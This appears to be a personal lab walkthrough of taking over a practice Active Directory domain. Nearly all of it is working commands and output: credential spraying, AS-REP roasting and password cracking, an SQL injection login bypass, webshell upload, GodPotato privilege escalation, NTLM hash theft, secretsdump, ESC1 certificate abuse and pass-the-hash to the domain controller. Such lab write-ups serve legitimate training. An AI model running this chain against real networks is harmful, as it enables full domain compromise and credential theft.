network discovery
``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.1        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.11       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.10       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)

```
![[Pasted image 20260817120029.png]]


spray the creds. We have MSSQL access
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ nxc-sweep 10.0.2.11 -u jgarcia -p 'Welcome2025!'
[*] Starting NXC sweep for 10.0.2.11 as jgarcia ...

[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.11       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)                                       
SMB         10.0.2.11       445    CLIENT-1         [+] hackerblueprint.local\jgarcia:Welcome2025! 
SMB         10.0.2.11       445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.11       445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.11       445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.11       445    CLIENT-1         ADMIN$                          Remote Admin
SMB         10.0.2.11       445    CLIENT-1         C$                              Default share
SMB         10.0.2.11       445    CLIENT-1         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.11       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local)                                                                        
WINRM       10.0.2.11       5985   CLIENT-1         [-] hackerblueprint.local\jgarcia:Welcome2025!
^[[A
^[[B[-] Port 3389 closed/filtered. Skipping rdp

[+] Port 1433 open. Checking mssql ...                                                                                                                                                                             
MSSQL       10.0.2.11       1433   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) (EncryptionReq:False)                                                  
MSSQL       10.0.2.11       1433   CLIENT-1         [+] hackerblueprint.local\jgarcia:Welcome2025! 
MSSQL       10.0.2.11       1433   CLIENT-1         name:master
MSSQL       10.0.2.11       1433   CLIENT-1         name:tempdb
MSSQL       10.0.2.11       1433   CLIENT-1         name:model
MSSQL       10.0.2.11       1433   CLIENT-1         name:msdb
MSSQL       10.0.2.11       1433   CLIENT-1         name:StaffPortal

```
![[Pasted image 20260817120531.png]]

Connect MSSQL
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ impacket-mssqlclient -windows-auth hackerblueprint.local/jgarcia:'Welcome2025!'@10.0.2.11
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(CLIENT-1\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(CLIENT-1\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server  (17.0.1000)
[!] Press help for extra shell commands
SQL (HACKERBLUEPRINT\jgarcia  guest@master)> SELECT name FROM master..sysdatabases;
name          
-----------   
master        
tempdb        
model         
msdb          
StaffPortal   

```

But we cant connect to StaffPortal and other dbs dont have anything interesting

Continue to bloodhound enum
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ bloodhound-python -u "jgarcia" -p 'Welcome2025!' -d hackerblueprint.local -c all --zip -ns 10.0.2.9      

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hackerblueprint.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hackerblueprint.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hackerblueprint.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hackerblueprint.local
INFO: Found 14 users
INFO: Found 53 groups
INFO: Found 4 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CLIENT-1.hackerblueprint.local
INFO: Querying computer: CLIENT-2.hackerblueprint.local
INFO: Querying computer: DC01.hackerblueprint.local
INFO: Done in 00M 00S
INFO: Compressing output into 20260817060012_bloodhound.zip

```
![[Pasted image 20260817130029.png]]

user enum
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ netexec ldap 10.0.2.9 -u "jgarcia" -p 'Welcome2025!' --users

LDAP        10.0.2.9        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) (signing:None) (channel binding:Never) 
LDAP        10.0.2.9        389    DC01             [+] hackerblueprint.local\jgarcia:Welcome2025! 
LDAP        10.0.2.9        389    DC01             [*] Enumerated 13 domain users: hackerblueprint.local
LDAP        10.0.2.9        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.9        389    DC01             Administrator                 2026-04-27 09:12:44 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.9        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.9        389    DC01             krbtgt                        2026-05-06 21:34:31 0        Key Distribution Center Service Account                     
LDAP        10.0.2.9        389    DC01             jgarcia                       2026-05-07 07:12:11 0        IT Support Technician                                       
LDAP        10.0.2.9        389    DC01             svc_archive                   2026-05-07 07:12:11 0        Archive Service Account                                     
LDAP        10.0.2.9        389    DC01             mharris                       2026-05-07 07:12:11 0        Finance Systems Analyst                                     
LDAP        10.0.2.9        389    DC01             twright                       2026-05-07 07:12:11 0        IT Systems Administrator                                    
LDAP        10.0.2.9        389    DC01             svc_deploy                    2026-05-10 07:24:07 0        Deployment Service Account                                  
LDAP        10.0.2.9        389    DC01             rjohnson                      2026-05-10 07:24:14 0        HR Coordinator                                              
LDAP        10.0.2.9        389    DC01             ksmith                        2026-05-10 07:24:15 0        Finance Analyst                                             
LDAP        10.0.2.9        389    DC01             dlee                          2026-05-10 07:24:15 0        IT Helpdesk                                                 
LDAP        10.0.2.9        389    DC01             amartinez                     2026-05-10 07:24:15 0        IT Support                                                  
LDAP        10.0.2.9        389    DC01             bwilson                       2026-05-10 07:24:15 0        HR Manager                                                  
```
![[Pasted image 20260817130203.png]]

add them to files
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ cat usernames   
Administrator
Guest
krbtgt
jgarcia
svc_archive
mharris
twright
svc_deploy
rjohnson
ksmith
dlee
amartinez
bwilson
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ cat pass     
Welcome2025!

```
![[Pasted image 20260817130340.png]]

AS-REP ROAST
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ impacket-GetNPUsers -dc-ip 10.0.2.9 'hackerblueprint.local/' -usersfile usernames -format hashcat
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User jgarcia doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_archive@HACKERBLUEPRINT.LOCAL:159bc2d42db3a2cc4cfc45ea5c2604b3$de36aaa7e00bb9511c14e7ee08d4c3d43a5dbe455e97fe094ba144d2abd00982a4b090495ffcd987d0c532c755c3ba65e54f76256f5ab8a1738ed0e23f1af1ecc558ccb0f64b450a0a1097f5e0e906a1e6ad95715cb2d8c1bd6401cd3e620727229363152b177936a3df8e47cfff1082b375a94b4a889ce23bdb5ab7cae6459c2314dcba88b3344224452e8a5ae218e02cd235f183ed7a276e533803dbae3c66d885cab239c156e31475a9281c9410337fe7d222ecaed8c3e7f598087fc5c8afcbec108ec5ab4fe2222b7d74cc1362419093e4982ddabc3ef773fda405cab34220a271be10e6ece527c94f75d6ece8a6dc62bb791aad2d05997fbb37bac5
[-] User mharris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User twright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_deploy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rjohnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ksmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amartinez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bwilson doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                           
```
![[Pasted image 20260817130633.png]]

cracked svc_archive:Softball1!
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ john hash_archieve --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Softball1!       ($krb5asrep$23$svc_archive@HACKERBLUEPRINT.LOCAL)     
1g 0:00:00:10 DONE (2026-08-17 06:07) 0.09900g/s 1048Kp/s 1048Kc/s 1048KC/s Solodiosyyo..Snyper26
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![[Pasted image 20260817130809.png]]

Spray the creds. Again no interesting access but lets try the mssql staffportal again
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ nxc-sweep 10.0.2.11 -u svc_archive -p 'Softball1!' 
[*] Starting NXC sweep for 10.0.2.11 as svc_archive ...
                                                                                                                                                                                                                   
[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.11       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)                                       
SMB         10.0.2.11       445    CLIENT-1         [+] hackerblueprint.local\svc_archive:Softball1! 
SMB         10.0.2.11       445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.11       445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.11       445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.11       445    CLIENT-1         ADMIN$                          Remote Admin
SMB         10.0.2.11       445    CLIENT-1         C$                              Default share
SMB         10.0.2.11       445    CLIENT-1         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.11       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local)                                                                        
WINRM       10.0.2.11       5985   CLIENT-1         [-] hackerblueprint.local\svc_archive:Softball1!

[-] Port 3389 closed/filtered. Skipping rdp
                                                                                                                                                                                                                   
[+] Port 1433 open. Checking mssql ...                                                                                                                                                                             
MSSQL       10.0.2.11       1433   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) (EncryptionReq:False)                                                  
MSSQL       10.0.2.11       1433   CLIENT-1         [+] hackerblueprint.local\svc_archive:Softball1! 
MSSQL       10.0.2.11       1433   CLIENT-1         name:master
MSSQL       10.0.2.11       1433   CLIENT-1         name:tempdb
MSSQL       10.0.2.11       1433   CLIENT-1         name:model
MSSQL       10.0.2.11       1433   CLIENT-1         name:msdb
MSSQL       10.0.2.11       1433   CLIENT-1         name:StaffPortal

```
![[Pasted image 20260817131115.png]]

okay found staffportal website on port 80. Login with basic sqli  `- OR 1=1--`
upload aspx webshell trough file upload
![[Pasted image 20260817141057.png]]

Try to get a shell from here. use rev shell cheat sheet, setup listener and boom
got shell as webapp
``` sh
PS C:\inetpub\wwwroot\staffportal\uploads> hostname
CLIENT-1
PS C:\inetpub\wwwroot\staffportal\uploads> whoami /all

USER INFORMATION
----------------

User Name          SID                                                       
================== ==========================================================
iis apppool\webapp S-1-5-82-36915396-2354840403-2245636125-7783855-1292957631


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```
![[Pasted image 20260817141249.png]]

We got SeImpersionate so lets abuse that

uploaded godpotato and added svc_archive to admin group

```sh
PS C:\inetpub\wwwroot\staffportal\uploads> .\potato.exe -cmd "cmd /c net localgroup administrators svc_archive  /add" 
[*] CombaseModule: 0x140727032152064
[*] DispatchTable: 0x140727034602968
[*] UseProtseqFunction: 0x140727033934448
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\99b150d7-5aea-4911-9e66-cad84eab73d4\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001402-0508-ffff-c6a9-0b151833fcb9
[*] DCOM obj OXID: 0xa87006f587cfc7a2
[*] DCOM obj OID: 0x1b6aab26764a191a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 876 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5076
The command completed successfully.

```
![[Pasted image 20260817141728.png]]

found script with credentials
``` sh
*Evil-WinRM* PS C:\ProgramData\HRConnect> cat HRDataSync.ps1
# HR Data Sync Script
# Scheduled Task: HRDataSync - runs daily at 02:00 AM

$SqlServer  = "DBSERV01.hackerblueprint.local"
$Database   = "HRReportsDB"
$Username   = "hackerblueprint\mharris"
$Password   = "Finance2024!"

# TODO: Update connection string when new DB server is provisioned
# DBSERV01 decommissioned Q3 2024

```
![[Pasted image 20260817143851.png]]

now mharris has READ, WRITER access to Shared share
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD8/loot]
└─$ nxc-sweep 10.0.2.9 -u mharris -p 'Finance2024!'
[*] Starting NXC sweep for 10.0.2.9 as mharris ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.9        445    DC01             [+] hackerblueprint.local\mharris:Finance2024! 
SMB         10.0.2.9        445    DC01             [*] Enumerated shares
SMB         10.0.2.9        445    DC01             Share           Permissions     Remark
SMB         10.0.2.9        445    DC01             -----           -----------     ------
SMB         10.0.2.9        445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.9        445    DC01             C$                              Default share
SMB         10.0.2.9        445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.9        445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.9        445    DC01             Shared          READ,WRITE      Shared Department Documents
SMB         10.0.2.9        445    DC01             SYSVOL          READ            Logon server share 

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.9        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) 
WINRM       10.0.2.9        5985   DC01             [-] hackerblueprint.local\mharris:Finance2024!


```
![[Pasted image 20260817200526.png]]

used ntlm_theft and responder on the share to get hash

twright : Solo2007!

pwned winrm client1
```sh
┌──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ nxc-sweep 10.0.2.11 -u twright -p 'Solo2007!'
[*] Starting NXC sweep for 10.0.2.11 as twright ...

[+] Port 445 open. Checking smb ...                                                                     
SMB         10.0.2.11       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.11       445    CLIENT-1         [+] hackerblueprint.local\twright:Solo2007! (Pwn3d!)
SMB         10.0.2.11       445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.11       445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.11       445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.11       445    CLIENT-1         ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.11       445    CLIENT-1         C$              READ,WRITE      Default share
SMB         10.0.2.11       445    CLIENT-1         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.11       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) 
WINRM       10.0.2.11       5985   CLIENT-1         [+] hackerblueprint.local\twright:Solo2007! (Pwn3d!)
WINRM       10.0.2.11       5985   CLIENT-1         [-] hackerblueprint.local\twright:Solo2007! zip() ar

```
![[Pasted image 20260817202646.png]]

we are admin on client1 and client2.
Dump secrets on Client2
```sh
┌──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ impacket-secretsdump twright@10.0.2.10
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

HACKERBLUEPRINT.LOCAL/svc_deploy:$DCC2$10240#svc_deploy#d1126dc3afdfae4eac7ecfabbe573580: (2026-05-10 11:28:34+00:00)

```

Crack it
svc_deploy : 140190-KS

and svc_deploy is member of CERTENROLL Group
![[Pasted image 20260817203257.png]]


Check certipy-ad. Vulnerable to ESC1
``` sh
┌──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ certipy-ad find -u svc_deploy@hackerblueprint.local -p 140190-KS -dc-ip 10.0.2.9 -vulnerable -stdout 

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates

<REDACTED>

    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

exploit to get admin hash
``` sh
──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ sudo certipy-ad req -u svc_deploy@hackerblueprint.local -p '140190-KS' -dc-ip '10.0.2.9' -target 'DC01.hackerblueprint.local' -ca 'HACKERBLUEPRINT-CA' -template 'CorpWebServer' -upn 'administrator@hackerblueprint.local'
[sudo] password for kali: 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hackerblueprint.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ sudo certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.2.9'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hackerblueprint.local'
[*] Using principal: 'administrator@hackerblueprint.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hackerblueprint.local': aad3b435b51404eeaad3b435b51404ee:c0ced2de918b4a7c1b9f4efd225dd503

```

and login to DC01 as admin
``` sh
┌──(kali㉿kali)-[~/…/AD8/exploit/ntlm_theft/click_me]
└─$ evil-winrm -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -i 10.0.2.9 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hackerblueprint\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01

```
![[Pasted image 20260817205028.png]]

